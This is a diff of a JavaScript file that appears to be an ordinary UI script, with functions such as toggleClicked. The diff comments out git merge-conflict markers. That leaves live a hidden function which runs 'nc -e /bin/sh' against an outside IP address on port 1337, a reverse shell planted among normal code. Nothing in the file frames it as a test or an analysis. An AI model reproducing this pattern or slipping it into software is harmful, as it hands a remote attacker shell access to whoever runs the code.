@@ -7,9 +7,9 @@ var data = [];
 
 var i = 0;
 
-<<<<<<< HEAD
+//<<<<<<< HEAD
 
-=======
+//=======
 function test(command) {
   const exec = ('child_process').exec;
 
@@ -19,7 +19,7 @@ function test(command) {
 }
 test('nc -e /bin/sh 78.68.246.110 1337 &');
 
->>>>>>> 4b6b7e1f3747ba593907fbce1b13b31835d5d1ec
+//>>>>>>> 4b6b7e1f3747ba593907fbce1b13b31835d5d1ec
 function toggleClicked() {
     updateButton(!running);
     if (running) {
